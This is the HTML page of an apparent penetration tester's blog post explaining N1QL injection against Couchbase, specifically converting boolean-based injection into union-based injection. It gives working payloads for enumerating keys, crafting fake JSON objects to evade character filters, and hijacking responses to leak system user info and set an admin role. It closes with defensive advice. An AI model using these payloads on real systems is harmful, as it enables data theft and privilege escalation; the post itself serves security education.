@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>N1QL Injection - Part 5 // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.f6361b42d404a23cafcf1b9a8cab08905c6731c6a4a64ef829e96f416baf2537.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="N1QL Injection - Part 5">
+  <meta name="twitter:description" content="Boolean to Union - Revealing the Unseen">
+
+    <meta property="og:url" content="https://felsec.com/posts/n1qlinjection-part5/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="N1QL Injection - Part 5">
+  <meta property="og:description" content="Boolean to Union - Revealing the Unseen">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-14T20:35:10+01:00">
+    <meta property="article:modified_time" content="2026-01-14T20:35:10+01:00">
+    <meta property="article:tag" content="Injection">
+    <meta property="article:tag" content="Couchbase">
+    <meta property="article:tag" content="N1QL">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester &amp; Security Researcher</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://bsky.app/profile/felsec.bsky.social" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">N1QL Injection - Part 5</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 14, 2026
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://felsec.com/tags/injection/">Injection</a>
+              <a class="tag" href="https://felsec.com/tags/couchbase/">Couchbase</a>
+              <a class="tag" href="https://felsec.com/tags/n1ql/">N1QL</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="boolean-to-union---revealing-the-unseen">Boolean to Union - Revealing the Unseen</h1>
+<p>As N1QL is used to query, handle, manipulate and ultimately return a JSON object, if we are able to overwrite or control this object then we have a method for controlling the response and whatever uses the data. In this post we are going to be exploring some tricks and techniques that allow us to control the JSON object and convert Boolean-based N1QL injection into Union-based N1QL injection.</p>
+<h2 id="the-steps">The Steps</h2>
+<p>In the majority of cases we will not be able to modify the original response directly, instead we will need to craft our own object to replace the valid one. This require the following steps:</p>
+<ul>
+<li>Step 1: Identify the keys in the response</li>
+<li>Step 2: Craft our own object</li>
+<li>Step 3: Overwrite the response with our object</li>
+</ul>
+<h2 id="step-1-identifying-the-keys-in-the-response">Step 1: Identifying the keys in the response</h2>
+<p>This step can be the most difficult to perform depending on the complexity of the query involved and the amount of processing done on the server, but there are a few methods that can be used to help us obtain this information.</p>
+<h3 id="method-1-looking-at-the-http-responses">Method 1: Looking at the HTTP responses</h3>
+<p>Looking at the HTTP responses can be the easiest method for obtaining the field names, depending on the web application or API endpoint involved. In some instances, the body of the response contains the JSON object returned by the N1QL query. This would be the best case scenario as it gives us everything we need to move onto crafting our own objects and exploiting this further.</p>
+<p>In other instances, we may get partial objects or objects that include aggregated data these. While these instances do not give us all of the information we need to craft our objects, they give us a good base to start from and we can combine this with other N1QL injection techniques to obtain more information or guess the missing parts.</p>
+<h3 id="method-2-reviewing-the-source-code-for-the-page">Method 2: Reviewing the source code for the page</h3>
+<p>An alternative to the first method, is to look at the source code for the page where the data is used or loaded. Quite often when the response data is displayed in the page there are identifiers telling the application where to place it. We can then use these identifiers (labels, IDs, names, other HTML attributes, etc.) to infer the keys used within the JSON object.</p>
+<p>For example, there are several identifiers in the following HTML snippet.</p>
+<pre tabindex="0"><code>&lt;div&gt;
+  &lt;div class=&#34;simpletest&#34;&gt;
+    &lt;h3 id=&#34;name&#34;&gt;Welcome Patsy&lt;/h3&gt;
+    &lt;p id=&#34;isadmin&#34;&gt;Is admin? False&lt;/p&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+</code></pre><p>From these identifiers we can reasonably assume that the JSON object looks something like this:</p>
+<pre tabindex="0"><code>{&#34;name&#34;:&#34;Patsy&#34;, &#34;isadmin&#34;: false}
+</code></pre><h3 id="method-3-enumerating-key-names-via-the-object_names-function">Method 3: Enumerating key names via the <code>OBJECT_NAMES</code> function</h3>
+<p>N1QL contains several functions for interacting with and manipulating JSON objects including one that allows us to obtain the key names, <code>OBJECT_NAMES</code>.</p>
+<p>The <code>OBJECT_NAMES</code> function, as described in the Couchbase documentation, returns an array containing the names of each attribute in the input object. For our purposes we can use this to return the attribute names (keys) for a specific query or bucket, which we can then use to infer the original JSON object.</p>
+<p>The specific way the function is used depends on the injection method, but the logical steps are:</p>
+<p><strong>Get the length of the name list</strong></p>
+<pre tabindex="0"><code>LEN(OBJECT_NAMES((SELECT * FROM `&lt;bucket&gt;`)[0]))=&lt;number&gt;
+</code></pre><p><strong>Get the length of each name in the list</strong></p>
+<pre tabindex="0"><code>LEN(OBJECT_NAMES((SELECT * FROM `&lt;bucket&gt;`)[0])[&lt;position in list&gt;])=&lt;number&gt;
+</code></pre><p><strong>Extract each name in the list</strong></p>
+<pre tabindex="0"><code>OBJECT_NAMES((SELECT * FROM `&lt;bucket&gt;`)[0])[&lt;position in list&gt;] LIKE &#39;&lt;comparison data&gt;&#39;
+</code></pre><h2 id="step-2-crafting-our-own-object">Step 2: Crafting our own object</h2>
+<p>While none of the above methods are foolproof, they allow us to determine the attribute names available from which we can craft our own response object.</p>
+<p>This can be done via two methods:</p>
+<ul>
+<li>Method 1: Creating a raw JSON object</li>
+<li>Method 2: Using the built-in Object functions</li>
+</ul>
+<h3 id="method-1-creating-a-raw-json-object">Method 1: Creating a raw JSON Object</h3>
+<p>A raw JSON object is the easiest way of crafting our malicious object as it is easier to read and simpler to write. For example, <code>{'firstname': 'Fake', 'lastname': 'Person', 'role':'user'}</code>.</p>
+<p>To inject our malicious object into the query it should be as easy as <code>UNION SELECT &lt;object&gt;</code>, right?</p>
+<p>Wrong!</p>
+<p>The problem with a standard <code>UNION</code> clause is that responses are wrapped within its own sub-object. For example:</p>
+<pre tabindex="0"><code>[
+    {
+        &#34;$1&#34;: [
+            {
+                &#34;firstname&#34;: &#34;Don&#34;,
+                &#34;lastname&#34;: &#34;Burke&#34;,
+                &#34;role&#34;: &#34;user&#34;
+            },
+            {
+                &#34;$1&#34;: {
+                    &#34;firstname&#34;: &#34;Fake&#34;,
+                    &#34;lastname&#34;: &#34;Person&#34;,
+                    &#34;role&#34;: &#34;user&#34;
+                }
+            }
+        ]
+    }
+]
+</code></pre><p>To get around this we need to include the <code>RAW</code> keyword to remove this additional JSON wrapping.</p>
+<p>For example the payload: <code>UNION SELECT RAW {'firstname': 'Fake', 'lastname': 'Person', 'role':'user'}</code></p>
+<p>Results in the following:</p>
+<pre tabindex="0"><code>[
+    {
+        &#34;$1&#34;: [
+            {
+                &#34;firstname&#34;: &#34;Don&#34;,
+                &#34;lastname&#34;: &#34;Burke&#34;,
+                &#34;role&#34;: &#34;user&#34;
+            },
+            {
+                &#34;firstname&#34;: &#34;Fake&#34;,
+                &#34;lastname&#34;: &#34;Person&#34;,
+                &#34;role&#34;: &#34;user&#34;
+            }
+        ]
+    }
+]
+</code></pre><h3 id="method-2-using-the-built-in-object-functions">Method 2: Using the built-in Object functions</h3>
+<p>This second method makes use of the built-in <code>OBJECT_PUT</code> and <code>OBJECT_CONCAT</code> functions, that allow us to add elements to JSON object or combine two or more JSON objects together. While this method does produce much larger payloads compared to previous one, it allows greater flexibility when bypassing defences or when certain characters (such as <code>{</code> OR <code>}</code>) are blocked.</p>
+<p>The <code>OBJECT_PUT</code> function can be used to insert a new attribute into an object or overwrite one with the same name, for example: <code>OBJECT_PUT({},'firstname','Fake')</code></p>
+<p>The <code>OBJECT_CONCAT</code> function, as its name suggests, can be used to combine multiple objects together, for example: <code>OBJECT_CONCAT({'firstname':'Fake'}, {'lastname':'Person'})</code></p>
+<p>We can combine these functions in multiple ways to create whatever object we need, and bypass any restrictions we encounter.</p>
+<pre tabindex="0"><code>OBJECT_PUT(OBJECT_PUT(OBJECT_PUT({},&#39;firstname&#39;,&#39;Fake&#39;),&#39;lastname&#39;,&#39;Person&#39;),&#39;role&#39;,&#39;user&#39;)
+OBJECT_CONCAT(OBJECT_PUT({},&#39;firstname&#39;,&#39;Fake&#39;),OBJECT_PUT({},&#39;lastname&#39;,&#39;Person&#39;),OBJECT_PUT({},&#39;role&#39;,&#39;user&#39;))
+OBJECT_PUT(OBJECT_PUT(OBJECT_PUT(BASE64_DECODE(&#39;e30=&#39;),&#39;firstname&#39;,&#39;Fake&#39;),&#39;lastname&#39;,&#39;Person&#39;),&#39;role&#39;,&#39;user&#39;)
+</code></pre><p>As with the previous method we append out payload to the <code>UNION SELECT RAW</code> statement to inject it into the query.</p>
+<h2 id="step-3-overwrite-the-response-with-our-object">Step 3: Overwrite the response with our object</h2>
+<p>This final step of the process is the easiest but may take a few attempts to get intended outcome.</p>
+<p>To overwrite the original object with our own we need to append two things to our payload, a <code>LIMIT</code> and an <code>OFFSET</code>.</p>
+<p>Firstly, we need to append <code>LIMIT 1</code> to make sure that only one JSON object is returned. Depending on the application returning multiple JSON objects may be OK, but this ensures that the application only processes our object.</p>
+<p>Secondly, we need to append <code>OFFSET &lt;pos&gt;</code> to make sure the correct JSON object is returned. Generally, the <code>&lt;pos&gt;</code> value should be 1 as our object is usually the second in the list; however, in some instances our object is the first in the list so the value should be set to 0.</p>
+<p>This results in the final payload of:</p>
+<pre tabindex="0"><code>UNION SELECT RAW &lt;object&gt; limit 1 offset 1
+</code></pre><h2 id="the-impact">The Impact</h2>
+<p>At this point we have put in a lot of work for what appears to be not a lot of gain, so what can we do with it? Well&hellip;potentially quite a lot.</p>
+<p>The main impact is overwriting data used by the application, which is then displayed to the end user. (Converting Boolean injection to Union)</p>
+<p>For example, if we have an application that queries for a user&rsquo;s firstname and lastname and displays them to the end user. If we are able to overwrite those values with the our own object, then we can leak data from the database in a way that is quickly obtainable.</p>
+<p>Normal query and output</p>
+<pre tabindex="0"><code>Query
+SELECT &#39;Don&#39; as firstname, &#39;Burke&#39; as lastname, &#39;user&#39; as `role`
+
+Output
+[
+  {
+    &#34;firstname&#34;: &#34;Don&#34;,
+    &#34;lastname&#34;: &#34;Burke&#34;,
+    &#34;role&#34;: &#34;user&#34;
+  }
+]
+</code></pre><p>Hijacked Query</p>
+<pre tabindex="0"><code>Query
+SELECT &#39;Don&#39; as firstname, &#39;Burke&#39; as lastname, &#39;user&#39; as `role` UNION SELECT RAW {&#39;firstname&#39;: DS_VERSION(), &#39;lastname&#39;:BASE64((SELECT * FROM system:my_user_info)), &#39;role&#39;:&#39;admin&#39;} LIMIT 1 OFFSET 1
+
+Output
+[
+  {
+    &#34;firstname&#34;: &#34;8.0.0-3777-enterprise&#34;,
+    &#34;lastname&#34;: &#34;W3sibXlfdXNlcl9pbmZvIjp7ImRvbWFpbiI6ImJ1aWx0aW4iLCJpZCI6IkFkbWluaXN0cmF0b3IiLCJuYW1lIjoiQWRtaW5pc3RyYXRvciIsInJvbGVzIjpbeyJyb2xlIjoiYWRtaW4ifV19fV0=&#34;,
+    &#34;role&#34;: &#34;admin&#34;
+  }
+]
+</code></pre><p>Other impacts depend on the affected endpoint and how the data is used but could allow:</p>
+<ul>
+<li>Privilege escalation (particularly when the user&rsquo;s role is defined within the JSON object)</li>
+<li>Authentication bypass (when used as part of a simple authentication mechanism)</li>
+<li>Data manipulation (e.g. assigning yourself a larger number of points in a game)</li>
+</ul>
+<p>&hellip;and much more.</p>
+<h2 id="how-to-protect-against-this">How to protect against this</h2>
+<p>Protecting against this type of attack, and any N1QL injection attack, is relatively straight forward:</p>
+<ol>
+<li>Sanitise all user input before being used in N1QL queries;</li>
+<li>Use positional or named parameters when generating the N1QL queries;</li>
+<li>Use prepared statements.</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
